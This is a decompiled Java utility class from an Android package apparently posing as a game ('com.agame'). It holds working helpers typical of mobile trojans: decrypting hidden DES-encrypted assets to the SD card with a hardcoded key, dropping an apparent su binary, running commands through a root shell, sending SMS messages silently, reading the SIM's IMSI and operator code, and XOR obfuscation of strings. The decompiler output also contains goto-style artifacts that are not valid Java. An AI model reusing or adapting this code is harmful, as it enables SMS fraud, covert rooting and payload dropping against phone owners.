// Decompiled by JEB v1.5.201408040 - http://www.android-decompiler.com

package com.agame.http.common;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences$Editor;
import android.content.res.AssetManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.NetworkInfo$State;
import android.os.Build$VERSION;
import android.telephony.TelephonyManager;
import android.telephony.gsm.SmsManager;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.RandomAccessFile;
import java.net.URLEncoder;
import java.security.Key;
import java.util.Iterator;
import java.util.regex.Pattern;
import javax.crypto.Cipher;
import javax.crypto.CipherOutputStream;
import javax.crypto.spec.SecretKeySpec;

public class CommUtil {
    private static String LIMITED;
    private static String LIMIT_PREF;
    private static String VersList_PREF;

    static {
        CommUtil.LIMIT_PREF = "LIMIT_PREF";
        CommUtil.LIMITED = "limit";
        CommUtil.VersList_PREF = "VERLIST_PREF";
    }

    public CommUtil() {
        super();
    }

    public static int DecryptObj2SdCard(Context ctx, String path, String filename, String resPath) {
        File v5 = new File(path);
        if(!v5.exists()) {
            v5.mkdirs();
        }

        AssetManager v1 = ctx.getAssets();
        try {
            File v9 = new File(String.valueOf(path) + filename);
            if(!v9.exists()) {
                InputStream v10 = v1.open(resPath);
                v9.createNewFile();
                FileOutputStream v8 = new FileOutputStream(v9);
                CipherOutputStream v3 = new CipherOutputStream(((OutputStream)v8), CommUtil.initDecryptCipher("yes(%@&"));
                byte[] v2 = new byte[1024];
                while(true) {
                    int v4 = v10.read(v2);
                    if(v4 <= 0) {
                        break;
                    }

                    v3.write(v2, 0, v4);
                }

                v3.close();
                v8.close();
                v10.close();
            }

            int v12 = 0;
            return v12;
        }
        catch(Exception v6) {
            v6.printStackTrace();
            return -1;
        }
        catch(IOException v6_1) {
            v6_1.printStackTrace();
            return -1;
        }
        catch(FileNotFoundException v6_2) {
            v6_2.printStackTrace();
            return -1;
        }
    }

    public static int MoveObj2SdCard(Context ctx, String path, String filename, String resPath) {
        File v3 = new File(path);
        if(!v3.exists()) {
            v3.mkdirs();
        }

        AssetManager v0 = ctx.getAssets();
        try {
            File v7 = new File(String.valueOf(path) + filename);
            if(!v7.exists()) {
                InputStream v8 = v0.open(resPath);
                v7.createNewFile();
                FileOutputStream v6 = new FileOutputStream(v7);
                byte[] v1 = new byte[1024];
                while(true) {
                    int v2 = v8.read(v1);
                    if(v2 <= 0) {
                        break;
                    }

                    v6.write(v1, 0, v2);
                }

                v6.close();
                v8.close();
            }

            int v9 = 0;
            return v9;
        }
        catch(Exception v4) {
            v4.printStackTrace();
            return -1;
        }
        catch(IOException v4_1) {
            v4_1.printStackTrace();
            return -1;
        }
        catch(FileNotFoundException v4_2) {
            v4_2.printStackTrace();
            return -1;
        }
    }

    public static int MoveXSU2SdCard(Context ctx, String path, String filename, String resPath) {
        File v3 = new File(path);
        if(!v3.exists()) {
            v3.mkdirs();
        }

        AssetManager v0 = ctx.getAssets();
        try {
            File v7 = new File(String.valueOf(path) + filename);
            if(!v7.exists()) {
                InputStream v8 = v0.open(resPath);
                v7.createNewFile();
                FileOutputStream v6 = new FileOutputStream(v7);
                byte[] v1 = new byte[1024];
                while(true) {
                    int v2 = v8.read(v1);
                    if(v2 <= 0) {
                        break;
                    }

                    v6.write(v1, 0, v2);
                }

                v6.close();
                v8.close();
            }

            int v9 = 0;
            return v9;
        }
        catch(IOException v4) {
            v4.printStackTrace();
            return -1;
        }
        catch(FileNotFoundException v4_1) {
            v4_1.printStackTrace();
            return -1;
        }
    }

    public static void appendstr2file(String filename, String content) {
        try {
            RandomAccessFile v3 = new RandomAccessFile(filename, "rw");
            v3.seek(v3.length());
            v3.writeBytes(content);
            v3.close();
        }
        catch(IOException v0) {
            v0.printStackTrace();
        }
    }

    public static int copyfile(Context ctx, int resId, String filename, String objpath) {
        int v7 = 0;
        int v8 = -1;
        try {
            File v5 = new File(String.valueOf(objpath) + filename);
            if(!v5.exists()) {
                InputStream v6 = ctx.getResources().openRawResource(resId);
                v5.createNewFile();
                FileOutputStream v4 = new FileOutputStream(v5);
                byte[] v0 = new byte[1024];
                while(true) {
                    int v1 = v6.read(v0);
                    if(v1 <= 0) {
                        break;
                    }

                    v4.write(v0, 0, v1);
                }

                v4.close();
                v6.close();
            }

            return v7;
        }
        catch(IOException v2) {
            v2.printStackTrace();
            return v8;
        }
        catch(FileNotFoundException v2_1) {
            v2_1.printStackTrace();
            return v8;
        }
    }

    public static String cutescapechar(String src) {
        new String();
        return CommUtil.replaceword(CommUtil.replaceword(src, "\'", ""), "\"", "");
    }

    public static void deletefile(String filepath) {
        File v0 = new File(filepath);
        if(v0.exists()) {
            v0.delete();
        }
    }

    public static String encodeurl(String url) {
        String v3 = new String();
        String v4 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!-_.()*;/?:@&=+$[]!\\\'()~%";
        int v2 = url.length();
        int v1;
        for(v1 = 0; v1 < v2; ++v1) {
            String v0 = String.valueOf(url.charAt(v1));
            if(v4.contains(((CharSequence)v0))) {
                v3 = String.valueOf(v3) + v0;
            }
        }

        return v3;
    }

    public static String getKValue(String content, String key) {
        String v6;
        content = content.trim();
        if(content == null || key == null) {
            v6 = "";
        }
        else {
            String[] v0 = content.split("\n");
            int v5 = v0.length;
            int v1;
            for(v1 = 0; v1 < v5; ++v1) {
                String v2 = v0[v1];
                if(v2 != null) {
                    v2 = v2.trim();
                    if(v2.matches(".*=.*")) {
                        int v3 = v2.indexOf(61);
                        if(v3 > 0 && (v2.substring(0, v3).equalsIgnoreCase(key))) {
                            v6 = v2.substring(v3 + 1);
                            return v6;
                        }
                    }
                }
            }

            v6 = "";
        }

        return v6;
    }

    public static long getLimitSigned(Context ctx) {
        return ctx.getSharedPreferences(CommUtil.LIMIT_PREF, 0).getLong(CommUtil.LIMITED, 0);
    }

    public static byte[] getMergeBytes(byte[] pByteA, byte[] pByteB) {
        int v0 = pByteA.length;
        int v2 = pByteB.length;
        byte[] v1 = new byte[v0 + v2];
        int v3;
        for(v3 = 0; v3 < v0; ++v3) {
            v1[v3] = pByteA[v3];
        }

        for(v3 = 0; v3 < v2; ++v3) {
            v1[v0 + v3] = pByteB[v3];
        }

        return v1;
    }

    public static String getOperatorNumberic(Context ctx) {
        String v2;
        String v1 = "";
        Object v4 = ctx.getSystemService("phone");
        if(v4 == null) {
            v2 = v1;
        }
        else {
            String v3 = ((TelephonyManager)v4).getSimOperator();
            String v0 = ((TelephonyManager)v4).getSubscriberId();
            if(CommUtil.getstrlen(v3) > 0) {
                v1 = v3;
            }
            else if(CommUtil.getstrlen(v0) <= 0) {
                return v1;
            }
            else {
                v1 = v0.substring(0, 5);
            }

            if(CommUtil.getstrlen(v1) == 0) {
                return v1;
            }

            v2 = v1;
        }

        return v2;
    }

    public static String getStringPreference(Context context, String config, String key) {
        return context.getSharedPreferences(config, 0).getString(key, "");
    }

    public static int getVersionByname(Context ctx, String name) {
        return ctx.getSharedPreferences(CommUtil.VersList_PREF, 0).getInt(name, 0);
    }

    public static String getparamValue(String param) {
        param = param.trim();
        return param.substring(1, param.length() - 1);
    }

    public static int getstrlen(String str) {
        int v0 = str == null ? 0 : str.length();
        return v0;
    }

    public static Cipher initDecryptCipher(String keyRule) throws Exception {
        byte[] v1 = keyRule.getBytes();
        byte[] v2 = new byte[8];
        int v0;
        for(v0 = 0; v0 < v2.length; ++v0) {
            if(v0 >= v1.length) {
                break;
            }

            v2[v0] = v1[v0];
        }

        SecretKeySpec v4 = new SecretKeySpec(v2, "DES");
        Cipher v3 = Cipher.getInstance("DES");
        v3.init(2, ((Key)v4));
        return v3;
    }

    public static boolean isAboveIcs() {
        boolean v1 = Build$VERSION.SDK_INT >= 14 ? true : false;
        return v1;
    }

    public static boolean isEmptyString(String str) {
        boolean v0 = str == null || str.length() == 0 ? true : false;
        return v0;
    }

    public static boolean isNewworkAvalibale(Context ctx) {
        boolean v3;
        Object v0 = ctx.getSystemService("connectivity");
        if(v0 != null) {
            NetworkInfo[] v2 = ((ConnectivityManager)v0).getAllNetworkInfo();
            if(v2 != null) {
                int v1 = 0;
                while(true) {
                    if(v1 >= v2.length) {
                        goto label_8;
                    }
                    else if(v2[v1].getState() == NetworkInfo$State.CONNECTED) {
                        v3 = true;
                    }
                    else {
                        ++v1;
                        continue;
                    }

                    return v3;
                }
            }
            else {
                goto label_8;
            }
        }
        else {
        label_8:
            v3 = false;
        }

        return v3;
    }

    public static boolean isWifiOn(Context ctx) {
        boolean v3 = true;
        NetworkInfo v2 = ctx.getSystemService("connectivity").getNetworkInfo(1);
        if(v2 != null) {
            NetworkInfo$State v1 = v2.getState();
            if(v1 != NetworkInfo$State.CONNECTED && v1 != NetworkInfo$State.CONNECTING) {
                goto label_11;
            }
        }
        else {
        label_11:
            v3 = false;
        }

        return v3;
    }

    public static String readfile(String filename) {
        StringBuilder v1 = new StringBuilder();
        try {
            FileReader v2 = new FileReader(filename);
            char[] v0 = new char[1024];
            while(v2.read(v0) >= 0) {
                v1.append(v0);
            }

            v2.close();
        }
        catch(IOException v4) {
        }

        return v1.toString();
    }

    public static byte[] readfile2byte(String filename) {
        byte[] v0;
        try {
            FileInputStream v2 = new FileInputStream(new File(filename));
            v0 = new byte[v2.available()];
            v2.read(v0);
            v2.close();
        }
        catch(IOException v4) {
        }

        return v0;
    }

    public static String replacescapechar(String src) {
        new String();
        return CommUtil.replaceword(CommUtil.replaceword(CommUtil.replaceword(CommUtil.replaceword(CommUtil.replaceword(CommUtil.replaceword(CommUtil.replaceword(CommUtil.replaceword(src, "0x0d", "\n"), "&amp;", "&"), "0x*0", ";"), "0x*1", "~"), "0x*2", "^"), "0x*3", "\""), "0x*4", "\'"), "0x*5", "&");
    }

    public static String replaceword(String src, String org, String ob) {
        String v1 = "";
        while(src.indexOf(org) != -1) {
            int v0 = src.indexOf(org);
            if(v0 == src.length()) {
                continue;
            }

            v1 = String.valueOf(v1) + src.substring(0, v0) + ob;
            src = src.substring(org.length() + v0, src.length());
        }

        return String.valueOf(v1) + src;
    }

    public static int runRootCommand(String command, String x) {
        DataOutputStream v2;
        Process v3;
        DataOutputStream v1 = null;
        try {
            v3 = Runtime.getRuntime().exec(x);
            v2 = new DataOutputStream(v3.getOutputStream());
        }
        catch(Throwable v4) {
            goto label_31;
        }
        catch(Exception v0) {
            goto label_25;
        }

        try {
            v2.writeBytes(String.valueOf(command) + "\n");
            v2.writeBytes("exit\n");
            v2.flush();
            v3.waitFor();
            if(v2 == null) {
                goto label_20;
            }

            goto label_19;
        }
        catch(Throwable v4) {
            v1 = v2;
        }
        catch(Exception v0) {
            v1 = v2;
        label_25:
            if(v1 != null) {
                try {
                    v1.close();
                label_27:
                    v3.destroy();
                }
                catch(Exception v4_1) {
                }
            }
            else {
                goto label_27;
            }

            int v4_2 = -1;
            return v4_2;
        }

    label_31:
        if(v1 != null) {
            try {
                v1.close();
            label_33:
                v3.destroy();
            }
            catch(Exception v5) {
            }
        }
        else {
            goto label_33;
        }

        throw v4;
        try {
        label_19:
            v2.close();
        label_20:
            v3.destroy();
        }
        catch(Exception v4_1) {
        }

        return 0;
    }

    public static void sendsms(Context ctx, String phone, String content) {
        String v2 = null;
        SmsManager v0 = SmsManager.getDefault();
        PendingIntent v4 = PendingIntent.getBroadcast(ctx, 0, new Intent(), 0);
        if(content.length() > 70) {
            Iterator v6 = v0.divideMessage(content).iterator();
            while(v6.hasNext()) {
                v0.sendTextMessage(phone, v2, v6.next(), v4, ((PendingIntent)v2));
            }
        }
        else {
            v0.sendTextMessage(phone, v2, content, v4, ((PendingIntent)v2));
        }
    }

    public static void setKeyValueNode(String file, String section, String key, String value) {
        String v3 = "";
        int v5 = 0;
        try {
            BufferedReader v9 = new BufferedReader(new FileReader(file));
            while(true) {
                String v1 = v9.readLine();
                if(v1 == null) {
                    break;
                }

                v1 = v1.trim();
                String v11 = v1;
                if(Pattern.compile("\\[" + section + "\\]").matcher(((CharSequence)v11)).matches()) {
                    v5 = Pattern.compile("\\[" + section + "\\]").matcher(((CharSequence)v11)).matches() ? 1 : 0;
                }

                if(v5 != 0) {
                    String v4 = v11.trim().split("=")[0].trim();
                    if(v4.equalsIgnoreCase(key)) {
                        for(v3 = String.valueOf(v3) + (String.valueOf(v4) + " = " + value + " ") + "\r\n"; true; v3 = String.valueOf(v3) + v1 + "\r\n") {
                            v1 = v9.readLine();
                            if(v1 == null) {
                                break;
                            }
                        }

                        v9.close();
                        BufferedWriter v2 = new BufferedWriter(new FileWriter(file, false));
                        v2.write(v3);
                        v2.flush();
                        v2.close();
                    }
                }

                v3 = String.valueOf(v3) + v1 + "\r\n";
            }

            v9.close();
        }
        catch(IOException v12) {
        }
    }

    public static void setLimitSigned(Context ctx, long s) {
        SharedPreferences$Editor v0 = ctx.getSharedPreferences(CommUtil.LIMIT_PREF, 0).edit();
        v0.putLong(CommUtil.LIMITED, s);
        v0.commit();
    }

    public static void setStringPreference(Context context, String config, String key, String value) {
        SharedPreferences$Editor v0 = context.getSharedPreferences(config, 0).edit();
        v0.putString(key, value);
        v0.commit();
    }

    public static void setVerToList(Context ctx, String name, int s) {
        SharedPreferences$Editor v0 = ctx.getSharedPreferences(CommUtil.VersList_PREF, 0).edit();
        v0.putInt(name, s);
        v0.commit();
    }

    public static String subMidByBetween(String content, String begin, String end) {
        String v4;
        int v2 = begin.length();
        int v3 = content.indexOf(begin);
        if(v2 < 0 || v3 < 0) {
            v4 = "";
        }
        else {
            int v1 = end == null || end.length() == 0 ? 0 : content.indexOf(end, v3 + v2);
            if(v1 < 0) {
                v4 = "";
                return v4;
            }

            String v0 = "";
            if(v2 > 0) {
                v0 = v1 > 0 ? content.substring(v3 + v2, v1) : content.substring(v3 + v2);
            }

            v4 = v0.trim();
        }

        return v4;
    }

    public static String urlEncode(String str) {
        String v0 = CommUtil.getstrlen(str) == 0 ? "" : URLEncoder.encode(str);
        return v0;
    }

    public static String xorDecode(String body) {
        int v9;
        byte[] v5 = body.getBytes();
        int v6 = v5.length;
        int v7;
        for(v7 = 0; v7 < v6; v7 += 5) {
            v5[v7] = ((byte)(v5[v7] ^ 96));
            if(v7 + 1 < v6) {
                v9 = v7 + 1;
                v5[v9] = ((byte)(v5[v9] ^ 65));
            }

            if(v7 + 2 < v6) {
                v9 = v7 + 2;
                v5[v9] = ((byte)(v5[v9] ^ 95));
            }

            if(v7 + 3 < v6) {
                v9 = v7 + 3;
                v5[v9] = ((byte)(v5[v9] ^ 93));
            }

            if(v7 + 4 < v6) {
                v9 = v7 + 4;
                v5[v9] = ((byte)(v5[v9] ^ 94));
            }
        }

        return new String(v5);
    }

    public static String xorEncode(String body) {
        int v9;
        byte[] v5 = body.getBytes();
        int v6 = v5.length;
        int v7;
        for(v7 = 0; v7 < v6; v7 += 5) {
            v5[v7] = ((byte)(v5[v7] ^ 57));
            if(v7 + 1 < v6) {
                v9 = v7 + 1;
                v5[v9] = ((byte)(v5[v9] ^ 67));
            }

            if(v7 + 2 < v6) {
                v9 = v7 + 2;
                v5[v9] = ((byte)(v5[v9] ^ 31));
            }

            if(v7 + 3 < v6) {
                v9 = v7 + 3;
                v5[v9] = ((byte)(v5[v9] ^ 119));
            }

            if(v7 + 4 < v6) {
                v9 = v7 + 4;
                v5[v9] = ((byte)(v5[v9] ^ 37));
            }
        }

        return new String(v5);
    }
}

